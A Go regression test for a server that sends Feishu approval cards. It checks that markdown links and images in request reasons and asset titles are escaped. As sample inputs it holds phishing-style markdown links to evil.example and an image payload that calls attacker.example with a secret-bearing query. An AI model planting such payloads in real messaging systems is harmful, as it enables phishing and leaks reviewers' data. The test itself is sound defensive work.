package api_test

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/hikariming/dsh-ee/server/internal/api"
	"github.com/hikariming/dsh-ee/server/internal/rbac"
	"github.com/hikariming/dsh-ee/server/internal/secret"
	"github.com/hikariming/dsh-ee/server/internal/store"
)

// feishuApprovalCard 是一张已发出的审批卡里与转义有关的文本：
// 标题是 plain_text（不解析 markdown），正文第一块是 markdown。
type feishuApprovalCard struct {
	Title    string
	Markdown string
}

// feishuApprovalCards 按发出顺序解析出所有审批卡。
func feishuApprovalCards(t *testing.T, fake *fakeFeishuMessages) []feishuApprovalCard {
	t.Helper()
	fake.mu.Lock()
	messages := append([]feishuMessage(nil), fake.messages...)
	fake.mu.Unlock()
	var cards []feishuApprovalCard
	for _, m := range messages {
		if m.Type != "interactive" {
			continue
		}
		var doc struct {
			Header struct {
				Title struct {
					Tag     string `json:"tag"`
					Content string `json:"content"`
				} `json:"title"`
			} `json:"header"`
			Body struct {
				Components []struct {
					Tag     string `json:"tag"`
					Content string `json:"content"`
				} `json:"components"`
			} `json:"body"`
		}
		if err := json.Unmarshal([]byte(m.Content), &doc); err != nil {
			t.Fatalf("审批卡不是合法 JSON：%v", err)
		}
		card := feishuApprovalCard{Title: doc.Header.Title.Content}
		for _, c := range doc.Body.Components {
			if c.Tag == "markdown" {
				card.Markdown = c.Content
				break
			}
		}
		if card.Markdown == "" {
			t.Fatalf("审批卡没有 markdown 正文：%s", m.Content)
		}
		cards = append(cards, card)
	}
	return cards
}

// TestFeishuCardMarkdownEscapesUserText 复现并卡住「员工可控文本原样进入审批卡
// markdown 正文」的注入面：申请理由、资产标题里的链接/图片语法必须在发卡时转义，
// 否则审批人收到的可信 bot 卡片会出现可点链接或自动加载的图片（钓鱼、IP/UA 泄露）。
// 同时确认正常中文、换行、数字与百分号不被破坏，以及 plain_text 标题保持原样。
func TestFeishuCardMarkdownEscapesUserText(t *testing.T) {
	st := openTestStore(t)
	ctx := context.Background()
	if _, err := api.Bootstrap(ctx, st, "admin", "admin-password-123"); err != nil {
		t.Fatal(err)
	}
	idp := newFakeIdP(t)
	fake := &fakeFeishuMessages{base: idp.Config.Handler}
	idp.Config.Handler = fake
	key := make([]byte, 32)
	_, _ = rand.Read(key)
	box, _ := secret.NewBox(key)
	srv := api.New(st, box, api.Options{DataDir: t.TempDir(), OIDCClient: idp.Client()}, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()

	admin := newClient(t, ts.URL)
	code, body := admin.do("POST", "/api/auth/login", map[string]string{"username": "admin", "password": "admin-password-123"}, nil)
	expect(t, "管理员登录", code, http.StatusOK, body)
	super, err := st.GetRoleByCode(ctx, rbac.RoleSuper)
	if err != nil {
		t.Fatal(err)
	}
	member, err := st.GetRoleByCode(ctx, rbac.RoleMember)
	if err != nil {
		t.Fatal(err)
	}
	reviewer := &store.User{Username: "reviewer", DisplayName: "审批人", Department: "研发部", AuthSource: store.AuthOIDC, ExternalDN: "feishu:ou-reviewer"}
	if err := st.CreateUser(ctx, reviewer); err != nil {
		t.Fatal(err)
	}
	if err := st.SetUserRoles(ctx, reviewer.ID, []int64{super.ID}); err != nil {
		t.Fatal(err)
	}
	hash, err := api.HashPassword("applicant-password-1")
	if err != nil {
		t.Fatal(err)
	}
	applicant := &store.User{Username: "applicant", DisplayName: "申请人", Department: "研发部", AuthSource: store.AuthLocal, PasswordHash: hash}
	if err := st.CreateUser(ctx, applicant); err != nil {
		t.Fatal(err)
	}
	if err := st.SetUserRoles(ctx, applicant.ID, []int64{member.ID}); err != nil {
		t.Fatal(err)
	}
	code, body = admin.do("PUT", "/api/admin/auth/oidc", map[string]any{
		"enabled": true, "preset": "feishu", "issuer": idp.URL, "clientId": "dsh-ee", "clientSecret": "idp-secret",
		"feishuApiBase": idp.URL, "feishuNotify": true, "feishuNotifyActions": true,
		"feishuVerificationToken": feishuTestToken, "autoCreate": true,
	}, nil)
	expect(t, "开启飞书通知与卡片", code, http.StatusOK, body)

	// 管理员直接上架三个只给财务部的技能（不发审批卡），研发部员工逐个申请权限，
	// 每次申请由服务端给审批人发一张卡片。
	const evilTitle = "[点我](https://evil.example/title)"
	assets := []struct{ slug, title string }{
		{"md-link", "链接注入回归技能"},
		{"md-image", "图片注入回归技能"},
		{"md-title", evilTitle},
	}
	for _, a := range assets {
		code, body = admin.do("POST", "/api/hub", map[string]any{
			"kind": "skill", "slug": a.slug, "delivery": "auto",
			"scope": map[string]any{"departments": []string{"财务部"}},
			"spec":  map[string]any{"title": a.title, "description": "markdown 注入", "body": "审批卡正文"},
		}, nil)
		expect(t, "上架技能 "+a.slug, code, http.StatusCreated, body)
	}

	applicantClient := newClient(t, ts.URL)
	code, body = applicantClient.do("POST", "/api/auth/login", map[string]string{"username": "applicant", "password": "applicant-password-1"}, nil)
	expect(t, "申请人登录", code, http.StatusOK, body)

	const (
		linkReason   = "需要查阅流程 [点我](https://evil.example/login)"
		imageReason  = "![](https://attacker.example/px?u=secret)"
		normalReason = "需要查看考勤流程\n核对 60% 的排班\n第 2 行"
	)
	reasons := []string{linkReason, imageReason, normalReason}
	for i, a := range assets {
		code, body = applicantClient.do("POST", "/api/me/access-requests", map[string]any{"kind": "skill", "slug": a.slug, "reason": reasons[i]}, nil)
		expect(t, "员工申请权限 "+a.slug, code, http.StatusCreated, body)
	}

	cards := feishuApprovalCards(t, fake)
	if len(cards) != len(assets) {
		t.Fatalf("应有 %d 张审批卡，实际 %d 张", len(assets), len(cards))
	}

	// 1) 申请理由里的链接语法被转义：卡片 markdown 里不能出现原始 "](" 触发序列。
	linkCard := cards[0].Markdown
	if strings.Contains(linkCard, "](https://evil.example/login)") {
		t.Fatalf("申请理由里的 markdown 链接没有转义，审批卡出现可点链接：%s", linkCard)
	}
	if !strings.Contains(linkCard, `\[点我\]`) {
		t.Fatalf("申请理由里的链接文本应按飞书 markdown 转义后显示：%s", linkCard)
	}
	if !strings.Contains(linkCard, "需要查阅流程") {
		t.Fatalf("转义不应破坏理由里的正常文字：%s", linkCard)
	}

	// 2) 图片语法同样被转义：不能留下 "!["，也不能留下 "](url)"。
	imageCard := cards[1].Markdown
	if strings.Contains(imageCard, "![") || strings.Contains(imageCard, "](https://attacker.example") {
		t.Fatalf("申请理由里的 markdown 图片没有转义，审批卡会自动加载攻击者图片：%s", imageCard)
	}
	if !strings.Contains(imageCard, `!\[\]`) {
		t.Fatalf("图片语法应按飞书 markdown 转义后显示：%s", imageCard)
	}

	// 3) 资产标题进入 markdown 正文时转义，但 header 标题是 plain_text 结构组件，保持原样
	// （标题模板是「{{title}} · 权限申请」，只替换参数，不做 markdown 转义）。
	plainCard := cards[2]
	if !strings.Contains(plainCard.Title, evilTitle) {
		t.Fatalf("plain_text 标题是结构组件，不应做 markdown 转义：%q", plainCard.Title)
	}
	if strings.Contains(plainCard.Markdown, "](https://evil.example/title)") {
		t.Fatalf("资产标题里的 markdown 链接没有转义：%s", plainCard.Markdown)
	}
	if !strings.Contains(plainCard.Markdown, `\[点我\]`) {
		t.Fatalf("资产标题应按飞书 markdown 转义后显示：%s", plainCard.Markdown)
	}
	// 4) 正常中文、换行、数字、百分号原样保留。
	if !strings.Contains(plainCard.Markdown, normalReason) {
		t.Fatalf("正常理由文本被转义破坏：%s", plainCard.Markdown)
	}
}
